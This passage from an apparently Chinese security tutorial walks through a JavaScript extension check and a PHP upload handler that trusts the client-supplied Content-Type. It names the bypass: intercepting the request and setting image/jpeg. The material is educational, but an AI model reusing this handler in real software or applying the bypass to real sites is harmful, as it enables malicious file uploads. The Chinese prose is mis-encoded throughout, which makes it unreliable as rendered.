(allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœæ–‡ä»¶ç±»å‹éªŒè¯é€šè¿‡ï¼Œè¿”å› true</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-è·å–æ–‡ä»¶è¾“å…¥æ¡†çš„å€¼"><a href="#1-è·å–æ–‡ä»¶è¾“å…¥æ¡†çš„å€¼" class="headerlink" title="1. è·å–æ–‡ä»¶è¾“å…¥æ¡†çš„å€¼"></a>1. è·å–æ–‡ä»¶è¾“å…¥æ¡†çš„å€¼</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileInput&#x27;</span>).<span class="property">value</span>;</span><br></pre></td></tr></table></figure><ul><li>**<code>document.getElementById(&#39;fileInput&#39;)</code>**ï¼šé€šè¿‡IDè·å–<code>&lt;input type=&quot;file&quot;&gt;</code>å…ƒç´ ã€‚</li><li>**<code>.value</code>**ï¼šè·å–ç”¨æˆ·é€‰æ‹©çš„æ–‡ä»¶è·¯å¾„ï¼ˆåœ¨æŸäº›æµè§ˆå™¨ä¸­ï¼Œå¯èƒ½åªè¿”å›æ–‡ä»¶åï¼‰ã€‚</li><li>**<code>var file</code>**ï¼šå°†è·å–åˆ°çš„å€¼å­˜å‚¨åœ¨å˜é‡<code>file</code>ä¸­ã€‚</li></ul><h4 id="2-æ£€æŸ¥æ˜¯å¦é€‰æ‹©äº†æ–‡ä»¶"><a href="#2-æ£€æŸ¥æ˜¯å¦é€‰æ‹©äº†æ–‡ä»¶" class="headerlink" title="2. æ£€æŸ¥æ˜¯å¦é€‰æ‹©äº†æ–‡ä»¶"></a>2. æ£€æŸ¥æ˜¯å¦é€‰æ‹©äº†æ–‡ä»¶</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>**<code>file == null || file == &quot;&quot;</code>**ï¼šæ£€æŸ¥<code>file</code>æ˜¯å¦ä¸ºç©ºï¼ˆç”¨æˆ·æœªé€‰æ‹©æ–‡ä»¶ï¼‰ã€‚</li><li>**<code>alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;)</code>**ï¼šå¦‚æœæœªé€‰æ‹©æ–‡ä»¶ï¼Œå¼¹å‡ºæç¤ºæ¡†ã€‚</li><li>**<code>return false</code>**ï¼šè¿”å›<code>false</code>ï¼Œè¡¨ç¤ºéªŒè¯å¤±è´¥ï¼Œé˜»æ­¢åç»­æ“ä½œã€‚</li></ul><h4 id="3-å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹"><a href="#3-å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹" class="headerlink" title="3. å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹"></a>3. å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>**<code>var allow_ext</code>**ï¼šå®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡ï¼Œå­˜å‚¨å…è®¸ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•åï¼Œç”¨<code>|</code>åˆ†éš”ã€‚</li></ul><h4 id="4-æå–ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å"><a href="#4-æå–ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å" class="headerlink" title="4. æå–ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å"></a>4. æå–ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br></pre></td></tr></table></figure><ul><li>**<code>file.lastIndexOf(&quot;.&quot;)</code>**ï¼šæ‰¾åˆ°æ–‡ä»¶åä¸­æœ€åä¸€ä¸ª<code>.</code>çš„ä½ç½®ã€‚</li><li>**<code>file.substring(...)</code>**ï¼šä»è¯¥ä½ç½®å¼€å§‹æˆªå–å­—ç¬¦ä¸²ï¼Œæå–æ–‡ä»¶æ‰©å±•åï¼ˆåŒ…æ‹¬<code>.</code>ï¼‰ã€‚</li><li>**<code>var ext_name</code>**ï¼šå°†æå–åˆ°çš„æ‰©å±•åå­˜å‚¨åœ¨å˜é‡<code>ext_name</code>ä¸­ã€‚</li></ul><h4 id="5-åˆ¤æ–­æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ "><a href="#5-åˆ¤æ–­æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ " class="headerlink" title="5. åˆ¤æ–­æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ "></a>5. åˆ¤æ–­æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> errMsg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name;</span><br><span class="line">    <span class="title function_">alert</span>(errMsg);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>**<code>allow_ext.indexOf(ext_name + &quot;|&quot;)</code>**ï¼šåœ¨<code>allow_ext</code>å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾<code>ext_name + &quot;|&quot;</code>ï¼ˆä¾‹å¦‚<code>.jpg|</code>ï¼‰ã€‚å¦‚æœæ‰¾ä¸åˆ°ï¼Œè¿”å›<code>-1</code>ã€‚</li><li>**<code>var errMsg</code>**ï¼šå®šä¹‰é”™è¯¯ä¿¡æ¯ï¼Œæç¤ºç”¨æˆ·å…è®¸çš„æ–‡ä»¶ç±»å‹å’Œå½“å‰æ–‡ä»¶ç±»å‹ã€‚</li><li>**<code>alert(errMsg)</code>**ï¼šå¼¹å‡ºé”™è¯¯æç¤ºæ¡†ã€‚</li><li>**<code>return false</code>**ï¼šè¿”å›<code>false</code>ï¼Œè¡¨ç¤ºéªŒè¯å¤±è´¥ï¼Œé˜»æ­¢åç»­æ“ä½œã€‚</li></ul><h4 id="6-éªŒè¯é€šè¿‡"><a href="#6-éªŒè¯é€šè¿‡" class="headerlink" title="6. éªŒè¯é€šè¿‡"></a>6. éªŒè¯é€šè¿‡</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœæ–‡ä»¶ç±»å‹éªŒè¯é€šè¿‡ï¼Œè¿”å›<code>true</code>ï¼Œè¡¨ç¤ºéªŒè¯æˆåŠŸï¼Œå¯ä»¥ç»§ç»­åç»­æ“ä½œï¼ˆä¾‹å¦‚æäº¤è¡¨å•ï¼‰ã€‚</li></ul><h3 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™æ®µä»£ç é€šè¿‡HTMLå’ŒJavaScriptå®ç°äº†ä»¥ä¸‹åŠŸèƒ½ï¼š</p><ol><li>ç”¨æˆ·é€šè¿‡<code>&lt;input type=&quot;file&quot;&gt;</code>é€‰æ‹©æ–‡ä»¶ã€‚</li><li>ç‚¹å‡»æŒ‰é’®æ—¶ï¼Œè°ƒç”¨<code>checkFile()</code>å‡½æ•°ã€‚</li><li>æ£€æŸ¥æ˜¯å¦é€‰æ‹©äº†æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰é€‰æ‹©ï¼Œå¼¹å‡ºæç¤ºå¹¶è¿”å›<code>false</code>ã€‚</li><li>æå–æ–‡ä»¶æ‰©å±•åï¼Œå¹¶æ£€æŸ¥æ˜¯å¦åœ¨å…è®¸çš„æ–‡ä»¶ç±»å‹åˆ—è¡¨ä¸­ã€‚</li><li>å¦‚æœæ–‡ä»¶ç±»å‹ä¸ç¬¦åˆè¦æ±‚ï¼Œå¼¹å‡ºé”™è¯¯æç¤ºå¹¶è¿”å›<code>false</code>ã€‚</li><li>å¦‚æœéªŒè¯é€šè¿‡ï¼Œè¿”å›<code>true</code>ï¼Œå…è®¸åç»­æ“ä½œã€‚</li></ol><p>è¿™ç§éªŒè¯æ–¹å¼ä¸»è¦ç”¨äºå‰ç«¯ç”¨æˆ·ä½“éªŒä¼˜åŒ–ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå‰ç«¯éªŒè¯å¯ä»¥è¢«ç»•è¿‡ï¼Œå› æ­¤åœ¨å®é™…åº”ç”¨ä¸­è¿˜éœ€è¦åœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œä¸¥æ ¼çš„æ–‡ä»¶ç±»å‹å’Œå®‰å…¨æ€§éªŒè¯ã€‚</p><h2 id="2-5-4-ç»•è¿‡contnet-type-æ£€æµ‹ä¸Šä¼ "><a href="#2-5-4-ç»•è¿‡contnet-type-æ£€æµ‹ä¸Šä¼ " class="headerlink" title="2.5.4 ç»•è¿‡contnet-type æ£€æµ‹ä¸Šä¼ "></a>2.5.4 ç»•è¿‡contnet-type æ£€æµ‹ä¸Šä¼ </h2><h3 id="ç»•è¿‡contnet-type-æ£€æµ‹æ–¹æ³•"><a href="#ç»•è¿‡contnet-type-æ£€æµ‹æ–¹æ³•" class="headerlink" title="ç»•è¿‡contnet-type æ£€æµ‹æ–¹æ³•"></a>ç»•è¿‡contnet-type æ£€æµ‹æ–¹æ³•</h3><p>ä¸Šä¼ æ–‡ä»¶,è„šæœ¬æ–‡ä»¶ï¼ŒæŠ“åŒ…æŠŠ content-type ä¿®æ”¹æˆ image&#x2F;jpeg å³å¯ç»•è¿‡ä¸Šä¼ ã€‚</p><h3 id="ç»•è¿‡contnet-type-æ£€æµ‹åŸç†"><a href="#ç»•è¿‡contnet-type-æ£€æµ‹åŸç†" class="headerlink" title="ç»•è¿‡contnet-type æ£€æµ‹åŸç†"></a>ç»•è¿‡contnet-type æ£€æµ‹åŸç†</h3><p>æœ‰äº›ä¸Šä¼ æ¨¡å—ï¼Œä¼š<strong>å¯¹ http çš„ç±»å‹å¤´è¿›è¡Œæ£€æµ‹</strong>ï¼Œå¦‚æœæ˜¯å›¾ç‰‡ç±»å‹ï¼Œå…è®¸ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨ï¼Œå¦åˆ™è¿”å›ä¸Šä¼ å¤±è´¥ã€‚å› ä¸º<strong>æœåŠ¡ç«¯æ˜¯é€šè¿‡ content-type åˆ¤æ–­ç±»å‹</strong>ï¼Œcontent-type åœ¨å®¢æˆ·ç«¯å¯è¢«ä¿®æ”¹ã€‚åˆ™æ­¤æ–‡ä»¶ä¸Šä¼ ä¹Ÿæœ‰å¯èƒ½è¢«ç»•è¿‡çš„é£é™©ã€‚</p><h3 id="åˆ†æcontnet-type-ä»£ç æ¼æ´"><a href="#åˆ†æcontnet-type-ä»£ç æ¼æ´" class="headerlink" title="åˆ†æcontnet-type ä»£ç æ¼æ´"></a>åˆ†æcontnet-type ä»£ç æ¼æ´</h3><p>é¦–å…ˆè¿›è¡Œ submit æäº¤åˆ¤æ–­ï¼Œå†æ£€æµ‹æ–‡ä»¶ç±»å‹å¦‚æœæ˜¯ image&#x2F;jpeg æˆ–è€… image&#x2F;png<br>å³å…è®¸ä¸Šä¼ ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``````</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¿™æ®µPHPä»£ç æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ å¤„ç†è„šæœ¬ï¼Œä¸»è¦åŠŸèƒ½æ˜¯æ¥æ”¶ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå¹¶æ ¹æ®æ–‡ä»¶ç±»å‹ï¼ˆMIMEç±»å‹ï¼‰è¿›è¡ŒéªŒè¯ã€‚å¦‚æœæ–‡ä»¶ç±»å‹ç¬¦åˆè¦æ±‚ï¼ˆ`image/jpeg`ã€`image/png`ã€`image/gif`ï¼‰ï¼Œåˆ™å°†æ–‡ä»¶ç§»åŠ¨åˆ°æŒ‡å®šçš„ä¸Šä¼ ç›®å½•ã€‚ä»¥ä¸‹æ˜¯ä»£ç çš„è¯¦ç»†è§£é‡Šï¼ŒåŒ…æ‹¬è¯­æ³•å’Œé€»è¾‘ã€‚</span><br><span class="line"></span><br><span class="line"><span class="comment">### ä»£ç ç»“æ„</span></span><br><span class="line">```php</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="comment">// åˆå§‹åŒ–ä¸Šä¼ çŠ¶æ€ä¸ºfalse</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; <span class="comment">// åˆå§‹åŒ–é”™è¯¯æ¶ˆæ¯ä¸ºç©º</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123; <span class="comment">// æ£€æŸ¥æ˜¯å¦æäº¤äº†è¡¨å•</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123; <span class="comment">// æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="comment">// è·å–ä¸´æ—¶æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; <span class="comment">// ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; <span class="comment">// å°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°ç›®æ ‡è·¯å¾„</span></span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>; <span class="comment">// è®¾ç½®ä¸Šä¼ çŠ¶æ€ä¸ºtrue</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>; <span class="comment">// è®¾ç½®é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>; <span class="comment">// æ–‡ä»¶ç±»å‹ä¸ç¬¦åˆè¦æ±‚ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>; <span class="comment">// ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä»£ç è¯¦ç»†è§£é‡Š"><a href="#ä»£ç è¯¦ç»†è§£é‡Š" class="headerlink" title="ä»£ç è¯¦ç»†è§£é‡Š"></a>ä»£ç è¯¦ç»†è§£é‡Š</h3><h4 id="1-åˆå§‹åŒ–å˜é‡"><a href="#1-åˆå§‹åŒ–å˜é‡" class="headerlink" title="1. åˆå§‹åŒ–å˜é‡"></a>1. åˆå§‹åŒ–å˜é‡</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="comment">// åˆå§‹åŒ–ä¸Šä¼ çŠ¶æ€ä¸ºfalse</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; <span class="comment">// åˆå§‹åŒ–é”™è¯¯æ¶ˆæ¯ä¸ºç©º</span></span><br></pre></td></tr></table></figure><ul><li><code>$is_upload</code>ï¼šå¸ƒå°”å˜é‡ï¼Œç”¨äºæ ‡è®°æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸã€‚</li><li><code>$msg</code>ï¼šå­—ç¬¦ä¸²å˜é‡ï¼Œç”¨äºå­˜å‚¨é”™è¯¯æ¶ˆæ¯æˆ–æç¤ºä¿¡æ¯ã€‚</li></ul><h4 id="2-æ£€æŸ¥è¡¨å•æ˜¯å¦æäº¤"><a href="#2-æ£€æŸ¥è¡¨å•æ˜¯å¦æäº¤" class="headerlink" title="2. æ£€æŸ¥è¡¨å•æ˜¯å¦æäº¤"></a>2. æ£€æŸ¥è¡¨å•æ˜¯å¦æäº¤</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>$_POST[&#39;submit&#39;]</code>ï¼šæ£€æŸ¥è¡¨å•æ˜¯å¦é€šè¿‡POSTæ–¹æ³•æäº¤ã€‚<code>submit</code>æ˜¯è¡¨å•ä¸­æäº¤æŒ‰é’®çš„åç§°ã€‚</li><li><code>isset()</code>ï¼šæ£€æŸ¥å˜é‡æ˜¯å¦å·²è®¾ç½®ä¸”ä¸ä¸º<code>null</code>ã€‚å¦‚æœè¡¨å•æäº¤æŒ‰é’®è¢«ç‚¹å‡»ï¼Œ<code>$_POST[&#39;submit&#39;]</code>ä¼šè¢«è®¾ç½®ã€‚</li></ul><h4 id="3-æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨"><a href="#3-æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨" class="headerlink" title="3. æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨"></a>3. æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>UPLOAD_PATH</code>ï¼šå¸¸é‡ï¼Œè¡¨ç¤ºæ–‡ä»¶ä¸Šä¼ çš„ç›®æ ‡ç›®å½•è·¯å¾„ã€‚</li><li><code>file_exists()</code>ï¼šæ£€æŸ¥æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ã€‚å¦‚æœä¸Šä¼ ç›®å½•ä¸å­˜åœ¨ï¼Œè„šæœ¬ä¼šè¿›å…¥<code>else</code>åˆ†æ”¯ã€‚</li></ul><h4 id="4-æ£€æŸ¥æ–‡ä»¶ç±»å‹æ˜¯å¦ç¬¦åˆè¦æ±‚"><a href="#4-æ£€æŸ¥æ–‡ä»¶ç±»å‹æ˜¯å¦ç¬¦åˆè¦æ±‚" class="headerlink" title="&#x3D;&#x3D;4. æ£€æŸ¥æ–‡ä»¶ç±»å‹æ˜¯å¦ç¬¦åˆè¦æ±‚&#x3D;&#x3D;"></a>&#x3D;&#x3D;4. æ£€æŸ¥æ–‡ä»¶ç±»å‹æ˜¯å¦ç¬¦åˆè¦æ±‚&#x3D;&#x3D;</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>$_FILES[&#39;upload_file&#39;][&#39;type&#39;]</code>ï¼šè·å–ä¸Šä¼ æ–‡ä»¶çš„MIMEç±»å‹ã€‚</li><li>è¿™é‡Œæ£€æŸ¥æ–‡ä»¶ç±»å‹æ˜¯å¦ä¸º<code>image/jpeg</code>ã€<code>image/png</code>æˆ–<code>image/gif</code>ã€‚åªæœ‰å½“æ–‡ä»¶ç±»å‹ç¬¦åˆè¿™äº›æ¡ä»¶æ—¶ï¼Œæ‰ä¼šç»§ç»­åç»­æ“ä½œã€‚</li><li><code>||</code>ï¼šé€»è¾‘â€œæˆ–â€è¿ç®—ç¬¦ï¼Œè¡¨ç¤ºæ»¡è¶³ä»»æ„ä¸€ä¸ªæ¡ä»¶å³å¯ã€‚</li></ul><h4 id="5-è·å–ä¸´æ—¶æ–‡ä»¶è·¯å¾„"><a href="#5-è·å–ä¸´æ—¶æ–‡ä»¶è·¯å¾„" class="headerlink" title="5. è·å–ä¸´æ—¶æ–‡ä»¶è·¯å¾„"></a>5. è·å–ä¸´æ—¶æ–‡ä»¶è·¯å¾„</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br></pre></td></tr></table></figure><ul><li><code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code>ï¼šè·å–ä¸Šä¼ æ–‡ä»¶çš„ä¸´æ—¶å­˜å‚¨è·¯å¾„ã€‚PHPä¼šå°†ä¸Šä¼ çš„æ–‡ä»¶ä¸´æ—¶å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æŸä¸ªç›®å½•ä¸­ã€‚</li></ul><h4 id="6-ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„"><a href="#6-ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„" class="headerlink" title="6. ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„"></a>6. ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br></pre></td></tr></table></figure><ul><li><code>UPLOAD_PATH</code>ï¼šç›®æ ‡ä¸Šä¼ ç›®å½•ã€‚</li><li><code>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code>ï¼šè·å–ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„åŸå§‹æ–‡ä»¶åã€‚</li><li><code>$img_path</code>ï¼šæ‹¼æ¥ç”Ÿæˆæœ€ç»ˆçš„ç›®æ ‡æ–‡ä»¶è·¯å¾„ï¼Œæ ¼å¼ä¸º<code>UPLOAD_PATH/æ–‡ä»¶å</code>ã€‚</li></ul><h4 id="7-ç§»åŠ¨ä¸Šä¼ æ–‡ä»¶"><a href="#7-ç§»åŠ¨ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="7. ç§»åŠ¨ä¸Šä¼ æ–‡ä»¶"></a>7. ç§»åŠ¨ä¸Šä¼ æ–‡ä»¶</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>; <span class="comment">// è®¾ç½®ä¸Šä¼ çŠ¶æ€ä¸ºtrue</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>; <span class="comment">// è®¾ç½®é”™è¯¯æ¶ˆæ¯</span></span><br><span 